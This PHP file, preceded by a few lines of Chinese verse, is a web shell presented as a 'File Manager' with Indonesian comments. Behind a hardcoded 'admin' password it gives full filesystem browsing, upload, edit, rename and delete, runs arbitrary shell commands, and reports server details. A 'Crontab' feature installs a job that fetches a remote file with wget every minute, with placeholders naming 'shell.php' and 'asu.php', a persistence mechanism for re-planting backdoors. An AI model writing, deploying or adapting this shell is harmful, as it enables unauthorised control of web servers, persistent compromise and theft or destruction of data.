青青子衿，悠悠我心。
但为君故，沉吟至今。
呦呦鹿鸣，食野之苹。
我有嘉宾，鼓瑟吹笙。
明明如月，何时可掇？
<?php
// === Sembunyikan semua error ===
error_reporting(0);
ini_set('display_errors', '0');

// === Helper Functions ===
function formatBytes($size, $precision = 1) {
    if ($size === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    for ($i = 0; $size >= 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, $precision) . ' ' . $units[$i];
}

function formatDate($timestamp) {
    return date('Y-m-d H:i', $timestamp);
}

session_start();

// === Konfigurasi ===
$PASSWORD = 'admin';
$BACKGROUND_IMG = 'https://wallpapercave.com/wp/wp10480126.jpg';
$ROOT_DIR = __DIR__;

// === Autentikasi ===
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    if ($_POST['password'] === $PASSWORD) {
        $_SESSION['logged_in'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    // ... login form sama ...
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login - File Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        html, body {
            height: 100%;
            width: 100%;
            overflow: hidden;
        }
        body {
            background: url('<?= $BACKGROUND_IMG ?>') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', sans-serif;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.75);
            padding: 30px 40px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.6);
            color: white;
            width: 320px;
            text-align: center;
        }
        .login-box h2 {
            margin-bottom: 20px;
            font-weight: 600;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            background: rgba(40,40,40,0.7);
            color: white;
        }
        .login-box input::placeholder { color: #aaa; }
        .login-box button {
            width: 100%;
            padding: 12px;
            background: #e74c3c;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-box button:hover { background: #c0392b; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2><i class="fas fa-lock"></i> File Manager Login</h2>
        <form method="post">
            <input type="password" name="password" placeholder="Password" required autofocus>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
    <?php
    exit;
}

// === Logout ===
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// === Tentukan direktori saat ini (untuk redirect nanti) ===
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $ROOT_DIR;
if ($dir === false) {
    $dir = $_GET['dir'] ?? $ROOT_DIR;
    if (!is_dir($dir)) {
        $dir = DIRECTORY_SEPARATOR;
    }
}
$dir = rtrim($dir, '/\\');

// === Aksi ===
$msg = '';

// Upload → tetap di $dir
if (isset($_POST['do_upload'])) {
    $targetDir = rtrim($_POST['dir'], '/\\');
    if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
        $target = $targetDir . '/' . basename($_FILES['file']['name']);
        if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            $msg = '<div class="notification success">✅ File uploaded successfully!</div>';
            // Tetap di direktori saat ini
            header('Location: ?dir=' . urlencode($targetDir));
            exit;
        } else {
            $msg = '<div class="notification error">❌ Upload failed!</div>';
        }
    } else {
        $msg = '<div class="notification error">❌ No file selected!</div>';
    }
}

// Save edit → tetap di direktori file tsb (sudah benar, tapi pastikan pakai dirname)
if (isset($_POST['save'])) {
    $file = $_POST['file'];
    $targetDir = dirname($file);
    if (@file_put_contents($file, $_POST['content']) !== false) {
        header('Location: ?dir=' . urlencode($targetDir));
        exit;
    } else {
        $msg = '<div class="notification error">❌ Save failed!</div>';
    }
}

// Rename → tetap di direktori yang sama
if (isset($_POST['rename'])) {
    $old = $_POST['old'];
    $newName = $_POST['newname'];
    $targetDir = dirname($old);
    $new = $targetDir . '/' . $newName;
    if (@rename($old, $new)) {
        header('Location: ?dir=' . urlencode($targetDir));
        exit;
    } else {
        $msg = '<div class="notification error">❌ Rename failed!</div>';
    }
}

// Delete → tetap di direktori induk file tsb
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    $targetDir = dirname($file);
    $result = is_dir($file) ? @rmdir($file) : @unlink($file);
    if ($result) {
        header('Location: ?dir=' . urlencode($targetDir));
        exit;
    } else {
        $msg = '<div class="notification error">❌ Delete failed!</div>';
    }
}

// === Crontab ===
if (isset($_POST['setup_crontab'])) {
    $url = trim($_POST['url']);
    $filename = trim($_POST['filename']);
    $targetDir = rtrim($_POST['dir'], '/\\');

    if (filter_var($url, FILTER_VALIDATE_URL) && $filename && $targetDir) {
        $fullPath = $targetDir . '/' . $filename;
        $cronJob = "* * * * * wget -O " . escapeshellarg($fullPath) . " " . escapeshellarg($url) . " >/dev/null 2>&1";

        $tmpFile = tempnam(sys_get_temp_dir(), 'cron');
        file_put_contents($tmpFile, $cronJob . "\n");

        $output = [];
        $return = 0;
        @exec('crontab -l 2>/dev/null | cat - ' . escapeshellarg($tmpFile) . ' | crontab - 2>&1', $output, $return);
        unlink($tmpFile);

        if ($return === 0) {
            $msg = '<div class="notification success">✅ Cron job added!</div>';
        } else {
            $msg = '<div class="notification error">❌ Failed to add cron job.</div>';
        }
    } else {
        $msg = '<div class="notification error">❌ Invalid URL or filename!</div>';
    }
}

// === Command via proc_open ===
$command_output = '';
if (isset($_POST['run_command'])) {
    $cmd = trim($_POST['command']);
    if ($cmd) {
        $cmd = escapeshellcmd($cmd);
        $descriptors = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $process = proc_open($cmd, $descriptors, $pipes, $dir);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $return_code = proc_close($process);
            $command_output = htmlspecialchars($output ?: $error ?: "(no output)");
        } else {
            $command_output = "❌ Failed to execute command.";
        }
    }
}

// === Navigasi Path ===
$cleanDir = str_replace('\\', '/', $dir);
$parts = array_filter(explode('/', $cleanDir));
$nav = '<a href="?dir=' . urlencode('/') . '" style="color:#000;text-decoration:none;">/</a>';
$current = '';
foreach ($parts as $part) {
    $current .= '/' . $part;
    $nav .= ' <i class="fas fa-chevron-right" style="font-size:10px;color:#666;"></i> ';
    $nav .= '<a href="?dir=' . urlencode($current) . '" style="color:#000;text-decoration:none;">' . htmlspecialchars($part) . '</a>';
}

// === Daftar File ===
$items = [];
if ($handle = @opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry == '.' || $entry == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $entry;
        $items[] = [
            'name' => $entry,
            'path' => $path,
            'is_dir' => is_dir($path),
            'size' => is_file($path) ? filesize($path) : 0,
            'mtime' => filemtime($path)
        ];
    }
    closedir($handle);
    usort($items, function($a, $b) {
        if ($a['is_dir'] == $b['is_dir']) {
            return strcasecmp($a['name'], $b['name']);
        }
        return $b['is_dir'] - $a['is_dir'];
    });
}

// === Info Server ===
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$serverInfo = [
    ['icon' => 'fa-user', 'label' => 'User', 'value' => get_current_user()],
    ['icon' => 'fa-microchip', 'label' => 'Kernel', 'value' => php_uname('s') . ' ' . php_uname('r')],
    ['icon' => 'fa-server', 'label' => 'Server Software', 'value' => $serverSoftware],
    ['icon' => 'fa-code', 'label' => 'PHP Version', 'value' => PHP_VERSION],
    ['icon' => 'fa-network-wired', 'label' => 'Server IP', 'value' => $_SERVER['SERVER_ADDR'] ?? 'N/A'],
    ['icon' => 'fa-laptop', 'label' => 'Your IP', 'value' => $_SERVER['REMOTE_ADDR'] ?? 'N/A'],
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            height: 100%;
            width: 100%;
            overflow-x: hidden;
        }
        body {
            background: url('<?= $BACKGROUND_IMG ?>') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            font-family: 'Segoe UI', sans-serif;
            padding: 0;
        }

        .server-panel {
            background: rgba(0, 0, 0, 0.75);
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            width: 100%;
            margin-top: 20px;
            border-radius: 16px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.4);
        }
        .server-info {
            font-size: 13px;
            line-height: 1.8;
            max-width: 320px;
        }
        .server-info div {
            display: flex;
            align-items: center;
        }
        .server-info i {
            width: 22px;
            text-align: center;
            margin-right: 8px;
            color: #4fc3f7;
        }

        .path-nav {
            text-align: center;
            padding: 8px 0;
            font-size: 14px;
            overflow-x: auto;
            white-space: nowrap;
            margin: 0 0 12px;
            width: 100%;
            color: #000;
            font-weight: 600;
        }

        .action-buttons {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .action-btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .action-btn:hover {
            background: #2980b9;
        }

        .upload-container {
            display: flex;
            justify-content: center;
            margin: 16px 0;
            width: 100%;
        }
        .upload-form {
            display: flex;
            gap: 12px;
            align-items: center;
            flex-wrap: wrap;
            max-width: 600px;
            width: 100%;
            padding: 0 10px;
        }
        .upload-form input[type="file"] {
            flex: 1;
            padding: 10px 14px;
            background: rgba(30,30,30,0.85);
            border: 1px solid #555;
            border-radius: 8px;
            color: white;
            font-size: 14px;
        }
        .upload-form button {
            background: #2ecc71;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
        }
        .upload-form button:hover { background: #27ae60; }

        .files-panel {
            background: rgba(0, 0, 0, 0.75);
            padding: 20px;
            width: 100%;
            margin-top: 10px;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.4);
        }
        .files-header {
            display: grid;
            grid-template-columns: 3fr 1fr 1.5fr 1fr;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.2);
            font-weight: bold;
            color: #4fc3f7;
            font-size: 14px;
        }
        .file-item {
            display: grid;
            grid-template-columns: 3fr 1fr 1.5fr 1fr;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255,255,255,0.08);
            align-items: center;
            font-size: 14px;
        }
        .file-name a, .file-name span {
            color: #fff;
            text-decoration: none;
            display: flex;
            align-items: center;
        }
        .file-name i {
            margin-right: 10px;
            color: #4fc3f7;
        }
        .file-actions {
            display: flex;
            gap: 14px;
            justify-content: flex-end;
        }
        .file-actions a {
            color: #bbb;
            text-decoration: none;
            font-size: 15px;
        }
        .file-actions a:hover { color: #4fc3f7; }

        .notification {
            padding: 12px;
            border-radius: 8px;
            margin: 20px auto;
            text-align: center;
            font-weight: 500;
            max-width: 600px;
            background: rgba(0,0,0,0.7);
            width: 96%;
            color: #fff;
        }
        .notification.success { color: #2ecc71; }
        .notification.error { color: #e74c3c; }

        .edit-area, .command-output {
            width: 100%;
            background: rgba(20,20,20,0.85);
            color: #fff;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            border: 1px solid #444;
            font-family: monospace;
            font-size: 14px;
            white-space: pre-wrap;
        }
        .command-form, .crontab-form, .edit-form, .rename-form {
            background: rgba(0,0,0,0.75);
            padding: 20px;
            border-radius: 12px;
            max-width: 700px;
            margin: 0 auto 20px;
        }
        .command-form input,
        .crontab-form input,
        .edit-form input,
        .rename-form input,
        .command-form textarea,
        .edit-form textarea {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            background: rgba(30,30,30,0.8);
            border: 1px solid #555;
            border-radius: 6px;
            color: white;
        }
        .command-form button,
        .crontab-form button,
        .edit-form button,
        .rename-form button {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px 5px 0 0;
        }
        .command-form button { background: #e67e22; }
        .command-form button:hover { background: #d35400; }
        .crontab-form button { background: #9b59b6; }
        .crontab-form button:hover { background: #8e44ad; }
        .edit-form button.save { background: #3498db; }
        .edit-form button.cancel,
        .rename-form button.cancel { background: #e74c3c; }
        .edit-form button.save:hover { background: #2980b9; }
        .edit-form button.cancel:hover,
        .rename-form button.cancel:hover { background: #c0392b; }
        .rename-form button.rename { background: #f39c12; }
        .rename-form button.rename:hover { background: #d35400; }
    </style>
</head>
<body>

<?= $msg ?>

<div class="server-panel">
    <div class="server-info">
        <?php foreach ($serverInfo as $info): ?>
            <div>
                <i class="fas <?= $info['icon'] ?>"></i>
                <strong><?= htmlspecialchars($info['label']) ?>:</strong> <?= htmlspecialchars($info['value']) ?>
            </div>
        <?php endforeach; ?>
    </div>
</div>

<div class="path-nav">
    <?= $nav ?>
</div>

<div class="action-buttons">
    <a href="?dir=<?= urlencode($ROOT_DIR) ?>" class="action-btn">
        <i class="fas fa-home"></i> Home
    </a>
    <a href="?crontab=1&dir=<?= urlencode($dir) ?>" class="action-btn">
        <i class="fas fa-clock"></i> Crontab
    </a>
    <a href="?command=1&dir=<?= urlencode($dir) ?>" class="action-btn">
        <i class="fas fa-terminal"></i> Command
    </a>
    <a href="?logout" class="action-btn">
        <i class="fas fa-sign-out-alt"></i> Logout
    </a>
</div>

<?php if (isset($_GET['crontab'])): ?>
    <div class="crontab-form">
        <h3 style="margin-bottom:15px;color:#9b59b6;"><i class="fas fa-clock"></i> Setup Crontab (wget every minute)</h3>
        <form method="post">
            <input type="hidden" name="dir" value="<?= htmlspecialchars($dir) ?>">
            <input type="url" name="url" placeholder="https://example.com/shell.php" required>
            <input type="text" name="filename" placeholder="asu.php" required>
            <button type="submit" name="setup_crontab">➕ Add Cron Job</button>
        </form>
        <div style="margin-top:15px;font-size:12px;color:#aaa;">
            ⚠️ File will be saved in current directory: <strong><?= htmlspecialchars($dir) ?></strong>
        </div>
    </div>
<?php elseif (isset($_GET['command'])): ?>
    <div class="command-form">
        <h3 style="margin-bottom:15px;color:#e67e22;"><i class="fas fa-terminal"></i> Run Linux Command</h3>
        <form method="post">
            <input type="hidden" name="dir" value="<?= htmlspecialchars($dir) ?>">
            <input type="text" name="command" placeholder="ls -la" required>
            <button type="submit" name="run_command">▶️ Execute</button>
        </form>
        <?php if ($command_output !== ''): ?>
            <div class="command-output"><?= $command_output ?></div>
        <?php endif; ?>
    </div>
<?php elseif (isset($_GET['edit'])):
    $editFile = $_GET['edit'];
    $content = @file_get_contents($editFile);
    if ($content === false) $content = '';
    ?>
    <div style="padding:20px;max-width:1000px;margin:0 auto;">
        <form method="post" class="edit-form">
            <input type="hidden" name="file" value="<?= htmlspecialchars($editFile) ?>">
            <h3 style="margin-bottom:15px;color:#3498db;">Edit: <?= htmlspecialchars(basename($editFile)) ?></h3>
            <textarea name="content" class="edit-area" style="height:70vh;"><?= htmlspecialchars($content) ?></textarea><br>
            <button type="submit" name="save" class="save">
                <i class="fas fa-save"></i> Save
            </button>
            <a href="?dir=<?= urlencode(dirname($editFile)) ?>" class="cancel" style="text-decoration:none;display:inline-block;padding:10px 20px;border-radius:6px;background:#e74c3c;color:white;">
                <i class="fas fa-times"></i> Cancel
            </a>
        </form>
    </div>
<?php elseif (isset($_GET['rename_form'])):
    $oldPath = $_GET['rename_form'];
    $oldName = basename($oldPath);
    ?>
    <div style="padding:20px;max-width:500px;margin:0 auto;">
        <form method="post" class="rename-form">
            <input type="hidden" name="old" value="<?= htmlspecialchars($oldPath) ?>">
            <h3 style="margin-bottom:15px;color:#f39c12;">Rename: <?= htmlspecialchars($oldName) ?></h3>
            <input type="text" name="newname" value="<?= htmlspecialchars($oldName) ?>" required>
            <button type="submit" name="rename" class="rename">
                <i class="fas fa-i-cursor"></i> Rename
            </button>
            <a href="?dir=<?= urlencode(dirname($oldPath)) ?>" class="cancel" style="text-decoration:none;display:inline-block;padding:10px 20px;border-radius:6px;background:#e74c3c;color:white;">
                <i class="fas fa-times"></i> Cancel
            </a>
        </form>
    </div>
<?php else: ?>
    <div class="upload-container">
        <form method="post" enctype="multipart/form-data" class="upload-form">
            <input type="hidden" name="dir" value="<?= htmlspecialchars($dir) ?>">
            <input type="file" name="file" required>
            <button type="submit" name="do_upload">📤 Upload</button>
        </form>
    </div>

    <div class="files-panel">
        <div class="files-header">
            <div>Name</div>
            <div>Size</div>
            <div>Date</div>
            <div>Actions</div>
        </div>
        <?php foreach ($items as $item): ?>
            <div class="file-item">
                <div class="file-name">
                    <?php if ($item['is_dir']): ?>
                        <a href="?dir=<?= urlencode($item['path']) ?>">
                            <i class="fas fa-folder"></i> <?= htmlspecialchars($item['name']) ?>
                        </a>
                    <?php else: ?>
                        <span>
                            <i class="fas fa-file"></i> <?= htmlspecialchars($item['name']) ?>
                        </span>
                    <?php endif; ?>
                </div>
                <div><?= $item['is_dir'] ? '—' : formatBytes($item['size']) ?></div>
                <div><?= formatDate($item['mtime']) ?></div>
                <div class="file-actions">
                    <?php if (!$item['is_dir']): ?>
                        <a href="?edit=<?= urlencode($item['path']) ?>" title="Edit"><i class="fas fa-edit"></i></a>
                    <?php endif; ?>
                    <a href="?rename_form=<?= urlencode($item['path']) ?>" title="Rename"><i class="fas fa-i-cursor"></i></a>
                    <a href="?delete=<?= urlencode($item['path']) ?>" onclick="return confirm('Delete this?')" title="Delete"><i class="fas fa-trash"></i></a>
                </div>
            </div>
        <?php endforeach; ?>
    </div>
<?php endif; ?>

</body>
</html>
